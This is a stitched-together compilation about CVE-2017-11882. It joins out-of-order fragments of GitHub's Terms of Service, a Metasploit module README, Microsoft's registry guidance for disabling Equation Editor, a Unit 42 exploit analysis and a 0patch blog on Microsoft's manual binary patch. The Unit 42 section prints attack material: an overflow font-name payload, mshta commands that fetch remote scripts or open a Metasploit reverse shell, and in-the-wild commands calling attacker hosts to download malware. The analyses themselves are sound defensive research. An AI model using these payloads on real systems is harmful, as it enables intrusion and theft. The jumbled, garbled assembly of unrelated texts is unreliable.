**Confidentiality Obligations.** You agree that any non-public Beta Preview information we give you, such as information about a private Beta Preview, will be considered GitHub’s confidential information (collectively, “Confidential Information”), regardless of whether it is marked or identified as such. You agree to only use such Confidential Information for the express purpose of testing and evaluating the Beta Preview (the “Purpose”), and not for any other purpose. You should use the same degree of care as you would with your own confidential information, but no less than reasonable precautions to prevent any unauthorized use, disclosure, publication, or dissemination of our Confidential Information. You promise not to disclose, publish, or disseminate any Confidential Information to any third party, unless we don’t otherwise prohibit or restrict such disclosure (for example, you might be part of a GitHub-organized group discussion about a private Beta Preview feature).

**Exceptions.** Confidential Information will not include information that is: (a) or becomes publicly available without breach of this Agreement through no act or inaction on your part (such as when a private Beta Preview becomes a public Beta Preview); (b) known to you before we disclose it to you; (c) independently developed by you without breach of any confidentiality obligation to us or any third party; or (d) disclosed with permission from GitHub. You will not violate the terms of this Agreement if you are required to disclose Confidential Information pursuant to operation of law, provided GitHub has been given reasonable advance written notice to object, unless prohibited by law.

### [3. Feedback](#3-feedback)

We’re always trying to improve of products and services, and your feedback as a Beta Preview user will help us do that. If you choose to give us any ideas, know-how, algorithms, code contributions, suggestions, enhancement requests, recommendations or any other feedback for our products or services (collectively, “Feedback”), you acknowledge and agree that GitHub will have a royalty-free, fully paid-up, worldwide, transferable, sub-licensable, irrevocable and perpetual license to implement, use, modify, commercially exploit and/or incorporate the Feedback into our products, services, and documentation.

## [K. Payment](#k-payment)

### [1. Pricing](#1-pricing)

Our pricing and payment terms are available at [github.com/pricing](https://github.com/pricing). If you agree to a subscription price, that will remain your price for the duration of the payment term; however, prices are subject to change at the end of a payment term.

### [2. Upgrades, Downgrades, and Changes](#2-upgrades-downgrades-and-changes)

* We will immediately bill you when you upgrade from the free plan to any paying plan.
* If you change from a monthly billing plan to a yearly billing plan, GitHub will bill you for a full year at the next monthly billing date.
* If you upgrade to a higher level of service, we will bill you for the upgraded plan immediately.
* You may change your level of service at any time by [choosing a plan option](https://github.com/pricing) or going into your [Billing settings](https://github.com/settings/billing). If you choose to downgrade your Account, you may lose access to Content, features, or capacity of your Account. Please see our section on [Cancellation](#l-cancellation-and-termination) for information on getting a copy of that Content.

### [3. Billing Schedule; No Refunds](#3-billing-schedule-no-refunds)

**Payment Based on Plan** For monthly or yearly payment plans, the Service is billed in advance on a monthly or yearly basis respectively and is non-refundable. There will be no refunds or credits for partial months of service, downgrade refunds, or refunds for months unused with an open Account; however, the service will remain active for the length of the paid billing period. In order to treat everyone equally, no exceptions will be made.

**Payment Based on Usage** Some Service features are billed based on your usage. A limited quantity of these Service features may be included in your plan for a limited term without additional charge. If you choose to use paid Service features beyond the quantity included in your plan, you pay for those Service features based on your actual usage in the preceding month. Monthly payment for these purchases will be charged on a periodic basis in arrears. See [GitHub Additional Product Terms for Details](/en/site-policy/github-terms/github-terms-for-additional-products-and-features).

**Invoicing** For invoiced Users, User agrees to pay the fees in full, up front without deduction or setoff of any kind, in U.S. Dollars. User must pay the fees within thirty (30) days of the GitHub invoice date. Amounts payable under this Agreement are non-refundable, except as otherwise provided in this Agreement. If User fails to pay any fees on time, GitHub reserves the right, in addition to taking any other action at law or equity, to (i) charge interest on past due amounts at 1.0% per month or the highest interest rate allowed by law, whichever is less, and to charge all expenses of recovery, and (ii) terminate the applicable order form. User is solely responsible for all taxes, fees, duties and governmental assessments (except for taxes based on GitHub's net income) that are imposed or become due in connection with this Agreement.

### [2. Upon Cancellation](#2-upon-cancellation)

We will retain and use your information as necessary to comply with our legal obligations, resolve disputes, and enforce our agreements, but barring legal requirements, we will delete your full profile and the Content of your repositories within 90 days of cancellation or termination (though some information may remain in encrypted backups). This information cannot be recovered once your Account is canceled.

We will not delete Content that you have contributed to other Users' repositories or that other Users have forked.

Upon request, we will make a reasonable effort to provide an Account owner with a copy of your lawful, non-infringing Account contents after Account cancellation, termination, or downgrade. You must make this request within 90 days of cancellation, termination, or downgrade.

### [3. GitHub May Terminate](#3-github-may-terminate)

This section does not affect your non-waivable rights.

### [2. Legal Notice to GitHub Must Be in Writing](#2-legal-notice-to-github-must-be-in-writing)

Communications made through email or GitHub Support's messaging system will not constitute legal notice to GitHub or any of its officers, employees, agents or representatives in any situation where notice to GitHub is required by contract or any law or regulation.

You agree to indemnify us, defend us, and hold us harmless from and against any and all claims, liabilities, and expenses, including attorneys’ fees, arising out of your use of the Website and the Service, including but not limited to your violation of this Agreement, provided that GitHub (1) promptly gives you written notice of the claim, demand, suit or proceeding; (2) gives you sole control of the defense and settlement of the claim, demand, suit or proceeding (provided that you may not settle any claim, demand, suit or proceeding unless the settlement unconditionally releases GitHub of all liability); and (3) provides to you all reasonable assistance, at your expense.

## [Q. Changes to These Terms](#q-changes-to-these-terms)

**Short version:** *We want our users to be informed of important changes to our terms, but some changes aren't that important — we don't want to bother you every time we fix a typo. So while we may modify this agreement at any time, we will notify users of any material changes and give you time to adjust to them.*

We reserve the right, at our sole discretion, to amend these Terms of Service at any time and will update these Terms of Service in the event of any such amendments. We will notify our Users of material changes to this Agreement, such as price increases, at least 30 days prior to the change taking effect by posting a notice on our Website or sending email to the primary email address specified in your GitHub account.

# CVE-2017-11882-metasploit

This is a Metasploit module which exploits CVE-2017-11882 using the POC below:

<https://embedi.com/blog/skeleton-closet-ms-office-vulnerability-you-didnt-know-about>.

## Installation

1. Copy the cve\_2017\_11882.rb to /usr/share/metasploit-framework/modules/exploits/windows/local/
2. Copy the cve-2017-11882.rtf to /usr/share/metasploit-framework/data/exploits/

This module is a quick port to Metasploit and uses mshta.exe to execute the payload.

There are better ways to implement this module and exploit but will update it as soon as I have the time.

## About

This is a Metasploit module which exploits CVE-2017-11882 using the POC released here : <https://embedi.com/blog/skeleton-closet-ms-office-vulnerability-you-didnt-know-about>.

# How to disable Equation Editor 3.0

Applies ToOffice Professional 2016 Office Standard 2016 Office 2013 SP1 Microsoft Office 2010 Service Pack 2

## Summary

This article provides guidance for users for disabling the Equation Editor in Office and WordPad by manually creating and setting registry entries.

## More Information

Equation Editor (Microsoft Equation 3.0) is a component that is included in Microsoft Office for compatibility with equations that were written in a version earlier than Office 2007. Users who want to disable the Equation Editor component can manually create and set registry entries for Microsoft Office. If you do so, some equation objects may not function correctly or be available to the user.

Use the following information to create and set the registry entries.

**Warning**: If you use Registry Editor incorrectly, you could cause serious problems that could require you to reinstall your operating system. Microsoft cannot guarantee that you can solve problems that result from using the Registry Editor incorrectly. Use the Registry Editor at your own risk. For information about how to edit the registry, view the "Changing Keys And Values" Help topic in Registry Editor (Regedit.exe) or view the "Add and Delete Information in the Registry" and "Edit Registry Data" Help topics in Regedt32.exe.

## Microsoft Office (Word, Excel, PowerPoint, Publisher, Outlook, and Visio) and WordPad

| **Office version** | **Registry subkey** |
| --- | --- |
| Office 2007 and later | Update the following registry subkey by changing the DWORD value:  [HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Office\Common\COM Compatibility\{0002CE02-0000-0000-C000-000000000046}]  "Compatibility Flags"=dword:00000400  Delete the following entries:  [HKEY\_CLASSES\_ROOT\CLSID\{0002CE02-0000-0000-C000-000000000046}]  [HKEY\_LOCAL\_MACHINE\SOFTWARE\Classes\Equation.3] |
| Office 2007 and later, x86 Office on x64 Windows | Update the following registry subkey by changing the DWORD value:  [HKEY\_LOCAL\_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Office\Common\COM Compatibility\{0002CE02-0000-0000-C000-000000000046}]  "Compatibility Flags"=dword:00000400  Delete the following entries:  [HKEY\_CLASSES\_ROOT\WOW6432Node\CLSID\{0002CE02-0000-0000-C000-000000000046}]  [HKEY\_LOCAL\_MACHINE\SOFTWARE\Classes\Equation.3] |

**Effect of disabling the Equation Editor component**

The following table displays the messages that users see in a given situation when the registry subkeys have been enabled and Equation Editor is disabled. There is a difference in the messages between Microsoft Office 2007 and other versions of Office.

| **Office version** | **Steps taken** | **Message** |
| --- | --- | --- |
| Office 2016, 2013, and 2010 | Double-click and edit Equation Editor 3.0 object  Right-click and edit Equation Editor 3.0 object | "One or more objects in this file have been disabled due to your policy settings." |
| Office 2016, 2013, and 2010 | Insert > Object > Equation Editor 3.0 | "This object cannot be inserted due to your policy settings." |
| Office 2007 | Double-click and edit Equation Editor 3.0 object  Right-click and edit Equation Editor 3.0 object | "References to external linked OLE files have been blocked." |
| Office 2007 | Insert > Object > Equation Editor 3.0 | "This component cannot be inserted at this location in the document." |

 **How to re-enable the Equation Editor component**

To re-enable Equation Editor, users must follow these steps:

1. Delete the registry subkey in Registry Editor.
2. Repair the Office installation through Control Panel. See [Repair an Office application](https://support.office.com/en-US/Article/Repair-an-Office-application-7821d4b6-7c1d-4205-aa0e-a6b40c5bb88b#ID0EAADAAA=Windows_10).

| **Office version** | **Registry subkey** |
| --- | --- |
| Office 2007 and later versions | Delete the following entry:  [HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Office\Common\COM Compatibility\{0002CE02-0000-0000-C000-000000000046}]    Repair the Office installation. |
| Office 2007 and later, x86 Office on x64 Windows | Delete the following entry:  [HKEY\_LOCAL\_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Office\Common\COM Compatibility\{0002CE02-0000-0000-C000-000000000046}]    Repair the Office installation. |

Recently, Palo Alto Networks Unit 42 vulnerability researchers captured multiple instances of traffic in the wild exploiting [CVE-2017-11882](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/), patched by Microsoft on November 14, 2017 as part of the monthly security update process. Exploits for this vulnerability have been released for Metasploit, and multiple security researchers have published articles on specific attacks taking advantage of this vulnerability. In this article, we describe the vulnerability and discuss mechanisms for exploiting it.

About CVE-2017-11882:

[Microsoft Equation Editor,](https://support.office.com/en-us/article/Equation-Editor-6eac7d71-3c74-437b-80d3-c7dea24fdf3f) which is a Microsoft Office component, contains a stack buffer overflow vulnerability that enables remote code execution on a vulnerable system. The component was compiled on November 9, 2000, over 17 years ago. Without any further recompilation, it was used in all currently upported versions of Microsoft Office. Microsoft Equation Editor is an out-of-process COM server that is hosted by eqnedt32.exe, meaning it runs as it’s own process and can accept commands from other processes.

Data Execution Prevention (DEP) and Address Space Layout Randomization (ASLR) should protect against such attacks. However, because of the manner in which eqnedt32.exe was linked, it will not use these features, subsequently allowing code execution. Being an out-of-process COM server, protections specific to Microsoft Office such as EMET and Windows Defender Exploit Guard are not applicable to eqnedt32.exe, unless applied system-wide.  This provides the attacker with an avenue to lure targets into opening specially crafted documents, resulting in the ability to execute an embedded attacker command.

Analysis of Exploit Proof of Concept:

The POC RTF sample we analyze in this section has the following attributes:

| **SHA256** | 02a69029bf2b0c97bfb9ddbbe6e89409f1b11007a92d8ca4a6df6597b72eb453 |
| --- | --- |

and is available on [GitHub](https://github.com/embedi/CVE-2017-11882/blob/master/example/exploit.rtf). Through analysis of the file contents, we can see the object class is Equation.3, which means it is an OLE equation object:

![1-rtf-hexdump]()

*Figure 1 RTF File Contents Showing Class Equation.3*

After extracting the object, we can skip OLE, CompObj and ObjInfo streams, and go directly to Equation Native stream:

![2-ole-hex-dump]()

*Figure 2 File Contents showing various Streams*

The stream has a header with [following structure](https://paloaltonetworks.sharepoint.com/sites/u42/Shared%20Documents/Publishing/Draft/1.%09https%3A/embedi.com/files/white-papers/skeleton-in-the-closet.pdf):

![Real Image 4]()

After that we can see the [MTEF](https://rtf2latex2e.sourceforge.net/MTEF3.html#Introduction) data, which contains a MTEF header and multiple records. MTEF is a binary equation format used by the equation editor. The header has the general information about the MTEF data:

| **Description** | **Size (byte)** | **Value** | **Comment** |
| --- | --- | --- | --- |
| MTEF Version | 1 | 0x3 | MTEFv3 |
| Generating Platform | 1 | 0x1 | Windows |
| Generating Product | 1 | 0x1 | Equation Editor |
| Product Version | 1 | 0x3 |  |
| Product Subversion | 1 | 0xa |  |

*Table 1METF header*

Following the header are some MTEF records. The malicious record that triggers the vulnerability is Font record, which in the sample has the below structure:

| **Description** | **Size (byte)** | **Value** | **Comment** |
| --- | --- | --- | --- |
| Tag | 1 | 0x8 | 0x8 denotes Font record |
| Typeface Number | 1 | 0x5a |  |
| Style | 1 | 0x5a |  |
| Font Name | Variable, NULL terminated | “cmd.exe /c calc.exe AAAAAAAAAAAAAAAAAAAAAAAA” + 0x00430c12 | Overflow and overwrite return address |

*Table 2 Font record*

The long font name overflows and causes the code execution. Putting it in the debugger to take a deeper look show us this:![3-ida]()

*Figure 3 IDA View of the Sample*

The vulnerability occurs when EQNEDT32.EXE tries to copy the font name into a locally created buffer. The buffer is only 40 (0x28) bytes, however if the font name is longer than 40 bytes (in this case 48 bytes), the buffer will overflow and EBP as well as the return address will be overwritten. When the function is done executing, the control flow will be taken to the attacker assigned address.

![4-od-before-font-name]()

*Figure 4 Before Font Name Copy*

![5-od-after-font-name]()

*Figure 5 After Font Name Copy*

In this case, the function will return “back” to 0x430c12, which is the address of WinExec, and the argument is the “font name”, also an attacker supplied input:![6-od-code-execution]()

*Figure 6 Debugger View of Returning to WinExec*

Then we can see the Windows calculator (calc.exe) opening:![7-od-calculator]()

*Figure 7 Calc.exe Displayed when the Exploit Completes*

Exploit Method Analysis

Next, we show a few ways attackers can exploit this vulnerability. In the proof of concept, the hexadecimal bytes, **636d642e657865202f632063616c632e65786520**, are used for the following command: **cmd.exe /c calc.exe**

When we opened the proof of concept, this executed the Windows calculator and we saw the calculator UI appear. However, there is a limitation with this method, as the buffer can only put so many bytes into the buffer that is overflowing.

![8-od]()

*Figure 8 IDA View of code copying overflow buffer into v4*

The size of an array that the attacker can overflow is 36 bytes (overflow\_buffer in the above figure). However, it is possible to use the space of the v12 variable and saved EBP, which allows for an extra 8 bytes of space. If the command we want to issue is longer than the combined 44 bytes available, how could we do that?

One way is to host a file on a server controlled by the attack and use the 44 bytes for a command that accesses that server and executes another binary. For example, the following command uses the mshta executable to run VBscript code from a remote server, as is only 37 characters long (ignoring the de-fanging brackets.)

**mshta http://192.168.56[.]102/test.html**

Below is code the attacker could host on that server, which would accomplish the same goal of executing the windows, but could do much more.

<HTML>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<HEAD>
<script language="VBScript">
Window.ReSizeTo 0, 0
Window.moveTo -2000,-2000
Set objShell = CreateObject("Wscript.Shell")
objShell.Run "calc.exe"
self.close
</script>
<body>
demo
</body>
</HEAD>
</HTML>

| 123456789101112131415 | <HTML><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><HEAD><script language="VBScript">Window.ReSizeTo 0, 0Window.moveTo -2000,-2000Set objShell = CreateObject("Wscript.Shell")objShell.Run "calc.exe"self.close</script><body>demo</body></HEAD></HTML> |
| --- | --- |

A similar option is to direct the injected instruction to point to a Metasploit server to give the attacker a reverse shell. In the screenshot below, Metasploit is being configured to host a remote shell on the server 192.168.56.103.

![9-od]()

*Figure 9 Running the Metasploit server*

The command we need to insert into our exploit is just 40 bytes long:

**mshta.exe http://192.168.56[.]103:8080/abc**

When the victim opens the vile, the Metasploit server delivers the reverse shell and gives the attacker control over the host (see below.)

Exploit Samples in the Wild

Since November 20th, we have identified thousands of attempted attacks which exploit this vulnerability in AutoFocus. Most of these use the techniques described above, either by calling cmd.exe directly or by using mshta.exe or cscript.exe to execute a remote script from an attacker controlled server. The table below shows examples of the most common techniques.

| Command | Parameters | Description | Example |
| --- | --- | --- | --- |
| **cmd.exe** | malicious file IP + remote malicious file | cmd.exe to call local malicious file cmd.exe to call remote malicious file | cmd.exe /c calc.exe cmd.exe /c start \\\\172.16.38.130\\c$\\1.exe |
| **cscript.exe** | script language + script | cscript.exe to call malicious file | cscript.exe //E:jscript \\\\xxd.cc\\bwou.png |
| **mshta.exe** | IP + remote malicious file | mshta.exe to call remote malicious file | mshta.exe http://104.254.99[.]77/x.txt mshta https://seliodrones[.]info/otr/otr.hta |
| **regsvr32.exe** | Installation Flags and remote malicious DLL | regsvr32.exe to call remote malicious DLL | regsvr32 /i:http[:]//1997106195 scrobj.dll &AA C |

One example of an attack in the wild includes this sample:

| **SHA256** | 7ccd19d3dc34c6dbee600961d73cee0cab5c6e421e9e6b8a31c0b65c14ae3551 |
| --- | --- |

This sample was distributed as a fake invoice document attachment in email to organizations in Europe. After the user opened the document it executed the following command:

**mshta.exe , mshta https://zilk[.]pw/url/index.hta**

The code was hosted (and is no longer available) at this location executed a PowerShell script which in turn would download and executes a file from: hxxps://zilk[.]pw/url/smstrace.exe. This file is a sample of the information stealing Trojan [FormBook](https://autofocus.paloaltonetworks.com/#/tag/Unit42.FormBook).

Despite the size limitations on the overflow buffer, many attackers have found ways to exploit this vulnerability to achieve their goals.

Conclusion and Mitigation:

CVE-2017-11882 is in the wild and will likely continue to be exploited for years to come. To remediate this issue, administrators should deploy Microsoft’s patch for this vulnerability, available here: <https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882> .

Those who can’t deploy the patch should consider disabling the Equation Editor as discussed in [Microsoft Knowledge Base Article 4055535](https://support.microsoft.com/help/4055535).

### Did Microsoft Just Manually Patch Their Equation Editor Executable? Why Yes, Yes They Did. (CVE-2017-11882)

**And They Did an Absolutely Stellar Job**

by Mitja Kolsek, the 0patch Team

[Update 11/21/2017]  Today Embedi published [their proof-of-concept exploit](https://github.com/embedi/CVE-2017-11882), which allowed us to see where exactly Microsoft's manual patch blocks it. Contrary to this article's original claim that CVE-2017-11882 was patched in function 4164FA while six other buffer overflow checks we found were for some other attack vectors, it is actually one of those six checks that blocks Embedi's exploit. This article has been slightly corrected to reflect that. In addition, we were now able to create a micropatch for Equation Editor that also blocks all exploits targeting the vulnerability found by Embedi. All Internet-connected computers with a registered 0patch Agent running have already received this micropatch and have it automatically applied whenever Equation Editor is launched. [End update 11/21/2017]

**A Pretty Old Executable**

The recent Patch Tuesday brought, among other things, a new version of "old" Equation Editor, which introduced a [fix for a buffer overflow issue](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882) reported by [Embedi](https://embedi.com/blog/skeleton-closet-ms-office-vulnerability-you-didnt-know-about).

The "old" Equation Editor is an *ancient* component of Microsoft Office (Office now uses an integrated Equation Editor), which is confirmed by looking at the properties of the unpatched EQNEDT32.EXE:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi8IEeFXdeDj9mNI75V11tpfyB2wAA0lkkdhh3Gwx3lE_tU7SRLB4tiCfPRAcjLeXftcue_6JyFhzhx2TLjvqdZ2wY7a77Rqb-kXquw2wpc57_luDHGxd3oCcVh2ptiMJwhc6VsJMsbxyw2/s640/Equation_editor_properties.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi8IEeFXdeDj9mNI75V11tpfyB2wAA0lkkdhh3Gwx3lE_tU7SRLB4tiCfPRAcjLeXftcue_6JyFhzhx2TLjvqdZ2wY7a77Rqb-kXquw2wpc57_luDHGxd3oCcVh2ptiMJwhc6VsJMsbxyw2/s1600/Equation_editor_properties.png)

We can see that *File version* is 2000.11.9.0 (implying being built in 2000), while *Date modified* is in 2003, which matches the time of its signature (signing modifies the file as the signature is attached to it.) Furthermore, the [*TimeDateStamp* in its PE header](https://msdn.microsoft.com/en-us/library/windows/desktop/ms680547%28v%3Dvs.85%29.aspx) (3A0ACEBF),
which the compiler writes into the executable module when building it,
indicates that the file was built on November 9, 2000 - exactly matching
the date in the above version number.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiT-yzvlWZUx42-mAhguywx14XNLDV-UW7wW5AVPEbjyvRed4Hsx6mMeuVcMHDMknQGX7WDHU_RWUDIkm8cq2tCsJKYBv_hOKJqphYLIkd6C6wDnYhCdZb6Utw_ZHKSYWvtCyE1-Ptva3fm/s640/Equation_editor_timestamp.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiT-yzvlWZUx42-mAhguywx14XNLDV-UW7wW5AVPEbjyvRed4Hsx6mMeuVcMHDMknQGX7WDHU_RWUDIkm8cq2tCsJKYBv_hOKJqphYLIkd6C6wDnYhCdZb6Utw_ZHKSYWvtCyE1-Ptva3fm/s1600/Equation_editor_timestamp.png)

We're therefore safe to claim that the vulnerable EQNEDT32.EXE has been with us since 2000. That's 17 years, which is a pretty respectable life span for software!

So now a vulnerability was reported in this executable and Microsoft spawned their fixing procedure: they reproduced the issue using Embedi's proof-of-concept, confirmed it, took the source code, fixed the issue in the source code, re-built EQNEDT32.EXE, and distributed the fixed version to Office users, who now see version 2017.8.14.0 under its properties.

At least that's how it *would* work for most other vulnerabilities. But something was different here. For some reason, Microsoft didn't fix this issue in the source code - but rather by manually patching the binary executable.

**Manually Patching an EXE?**

Really, quite literally, some pretty skilled Microsoft employee or contractor reverse engineered our friend EQNEDT32.EXE, located the flawed code, and corrected it by manually overwriting existing instructions with better ones (making sure to only use the space previously occupied by original instructions).

How do we know that? Well, have you ever met a C/C++ compiler that would put all functions in a 500+ KB executable on **exactly the same address in the module** after rebuilding a modified source code, especially when these modifications changed the amount of code in several functions?

To clarify, let's look at BinDiff results between the fixed (2017.8.14.0, "primary") and vulnerable version (2000.11.9.0, "secondary") of EQNEDT32.EXE:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgnUHMd534sZyKvY8L5kPC7UfzjLazmo6ywEspdFSJwQHIlvD7R362ECK-OlBECc9OruM0F8UMM1Ov3FEUEONfgx8wG5gWfHOGgJ4ITBLhOcdW6oa3PnmQjKKR9kVRYWwoOFhUS9f6NrXx4/s640/Equation_Editor_diff_matched_functions.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgnUHMd534sZyKvY8L5kPC7UfzjLazmo6ywEspdFSJwQHIlvD7R362ECK-OlBECc9OruM0F8UMM1Ov3FEUEONfgx8wG5gWfHOGgJ4ITBLhOcdW6oa3PnmQjKKR9kVRYWwoOFhUS9f6NrXx4/s1600/Equation_Editor_diff_matched_functions.PNG)

If you're diffing binaries a lot, you'll notice something highly peculiar: All *EA primary* values are identical to *EA secondary* values of matched functions. Even the matched but obviously different functions listed at the bottom are at the same address in both EQNEDT32.EXE versions.

As we already [noted on Twitter](https://twitter.com/0patch/status/930803478930345984), Microsoft modified five functions in EQNEDT32.EXE, namely the bottom-most five functions listed on the above image. Let's look at the most-modified one first, the one at address 4164FA. The patched version is on the left, the vulnerable one on the right.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh0DFJCW0nBXQQbl5RVesEv8yM5C4y6vqJLDXboQr7_SinByDrH8i7A0dq-uhsrjEHUxmnaRgD7ar1gqcUZskbpbnkOHLADbvUWK6fiHtQ4Z3b3Y9_AFWejkevLIK1_ShFFk4Xru5BHv4rb/s640/Equation_Editor_diff_patched_function.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh0DFJCW0nBXQQbl5RVesEv8yM5C4y6vqJLDXboQr7_SinByDrH8i7A0dq-uhsrjEHUxmnaRgD7ar1gqcUZskbpbnkOHLADbvUWK6fiHtQ4Z3b3Y9_AFWejkevLIK1_ShFFk4Xru5BHv4rb/s1600/Equation_Editor_diff_patched_function.PNG)

This function takes a pointer to the destination buffer and copies characters, one by one in a loop, from user-supplied string to this buffer. It is also the very function that Embedi found to be vulnerable in their research; namely, there was no check whether the destination buffer was large enough for the user-supplied string, and a too-long font name provided through the Equation object could cause a buffer overflow.

Microsoft's fix introduced an additional parameter to this function, specifying the destination buffer length. The original logic of the character-copying loop was then modified so that the loop ends not only when the source string end is reached, but also when the destination buffer length is reached - preventing buffer overflow. In addition, the copied string in the destination buffer is zero-terminated after copying, in case the destination buffer length was reached (which would leave the string unterminated).

Let's look at the code in its text form (again, patched function on left, vulnerable on right):

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhbwrISsFajRN3RaxX4Ifogd77w010gSKkHjcEc3aVQio1cmoo1FaZk-17WBJ1tlj3CfuKnGcRhLRfA9XnWdrCXq9Rc0sHrMZp5BFIdWaKZvDHyyuMEeEgMClLRS7R67_SK6J2Z32q9bp7C/s640/Patched_function_code_diff.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhbwrISsFajRN3RaxX4Ifogd77w010gSKkHjcEc3aVQio1cmoo1FaZk-17WBJ1tlj3CfuKnGcRhLRfA9XnWdrCXq9Rc0sHrMZp5BFIdWaKZvDHyyuMEeEgMClLRS7R67_SK6J2Z32q9bp7C/s1600/Patched_function_code_diff.png)
As you can see, whoever patched this function not only added a check for buffer length in it, but also managed to make the function 14 bytes shorter (and padded the resulting gap before the adjacent function with 0xCC bytes for style points :). Impressive.

**Patching The Callers**

Moving on. If the patched function got an additional parameter, all those calling it would have to change as well, right? There are exactly two callers of this function, at addresses 43B418 and 4181FA, and in the patched version they both have a push instruction added before the call to specify the length of their buffers, 0x100 and 0x1F4 respectively.

Now, a push instruction with a 32-bit literal operand takes 5 bytes. In order to add this instruction to these two functions while staying within the tight space of the original code (whose logic must also remain intact), thepatcher did the following:

For function at address 43B418, the patched function temporarily stores some value - which it will need later on - in ebx instead of a local stack-based variable, which releases enough bytes for injecting the push call. (By the way, additional evidence of manual patching is that while the local variable is no longer used, space for it is still made on the stack; otherwise sub esp, 0x10C would turn into sub esp, 0x108.)

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEio38llUlygTJ_NsRRaHIHkYqhPZXmmCF3sec3kgiPqTRSqZc21cIHCTf7_o8bkaiSSnrO8AFfjB0e1TbNZSK3PpkGazDI_JmSCZROrAr1IEnr82JMAkUMze8W3luLRzlmCtio_UGx79KMm/s640/Equation_Editor_diff_43B418.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEio38llUlygTJ_NsRRaHIHkYqhPZXmmCF3sec3kgiPqTRSqZc21cIHCTf7_o8bkaiSSnrO8AFfjB0e1TbNZSK3PpkGazDI_JmSCZROrAr1IEnr82JMAkUMze8W3luLRzlmCtio_UGx79KMm/s1600/Equation_Editor_diff_43B418.PNG)

For the other caller, function at address 4181FA, the patched function mysteriously has the push instruction injected without any other modifications to the code that would introduce the needed extra space.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEixj_rLisDsJMndmTGOXDoSi4ncN01cOenpN6wYH67Qx3dR5_-PZjDwb6QSNOXRIGQjPyrY_aGnOs8RiGHkzuYEM_Nx4rc8UphiGCN8kq6k8yGB_Aex6JfpCpVjXKueKWC9kWqgKrwLL_Q-/s640/Equation_Editor_diff_4181FA.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEixj_rLisDsJMndmTGOXDoSi4ncN01cOenpN6wYH67Qx3dR5_-PZjDwb6QSNOXRIGQjPyrY_aGnOs8RiGHkzuYEM_Nx4rc8UphiGCN8kq6k8yGB_Aex6JfpCpVjXKueKWC9kWqgKrwLL_Q-/s1600/Equation_Editor_diff_4181FA.PNG)

As you can see on the above image, the push instruction is injected at the beginning of the yellow block, and all original instructions in that block are pushed down 5 bytes. But why does this not overwrite 5 bytes of the original code somewhere else? It's as if there were 5 or more unused bytes already in existence just after this block of code that the patcher could safely overwrite.

To solve this mystery, let's look at the code in its text form.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgEfprSByDLlfoqDcG4K_JeQ7pEcclD2HwPzP60YC-GuNmOG7g7rGZiw6cm4BqCoeBye_z04njU2LmXb9P7AfOSYEKLnXFMC8L3w-Co3W-Pf-c76Q7RaX7B4G0wNsYhbD1A9tiQKbrnc9kz/s640/4181FA_code_diff.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgEfprSByDLlfoqDcG4K_JeQ7pEcclD2HwPzP60YC-GuNmOG7g7rGZiw6cm4BqCoeBye_z04njU2LmXb9P7AfOSYEKLnXFMC8L3w-Co3W-Pf-c76Q7RaX7B4G0wNsYhbD1A9tiQKbrnc9kz/s1600/4181FA_code_diff.PNG)

Surprise, the vulnerable version actually had an extra jmp loc\_418318 instruction at the end of the modified code block. How convenient! This allows the code in this block to be moved down 5 bytes, making space for the push instruction at the top.

Coincidence? Perhaps, but it looks an awful lot like this code block got manually modified before in the past, whereby it got shortened for 5 bytes and its last instruction (jmp loc\_418318) was left there.

**Additional Security Checks**

What we've covered so far was related to Embedi's published research and CVE-2017-11882, but is *not* what blocks Embedi's exploit. The new version of EQNEDT32.EXE has two additional modified functions at addresses 41160F and 4219F0. Let's have a look at them.

In the patched executable, these two functions got a bunch of injected boundary checks for copying to what appear to be 0x20-byte buffers. These checks all look the same: ecx (which is the counter for copying) is compared to 0x21; if it's greater than or equal to that, ecx gets set to 0x20. All these checks are injected right before inlined memcpy operations. Let's look at one of them to see how the patcher made room for the additional instructions.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhe0z6vud-e8X-qN8MdsAuXQ3tdKEVU6NbGAw-0DjAtqoprFTNriJYQEO1CPN3Wpd7RilpN9K_Oq8K_kIB19Nn4YjD6tcAV9DN4sIn4WpU0nizx4DkVVgHmqZWjqTKI5Z9CtlF4t2lm2ijK/s640/Equation_Editor_diff_41160F.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhe0z6vud-e8X-qN8MdsAuXQ3tdKEVU6NbGAw-0DjAtqoprFTNriJYQEO1CPN3Wpd7RilpN9K_Oq8K_kIB19Nn4YjD6tcAV9DN4sIn4WpU0nizx4DkVVgHmqZWjqTKI5Z9CtlF4t2lm2ijK/s1600/Equation_Editor_diff_41160F.PNG)

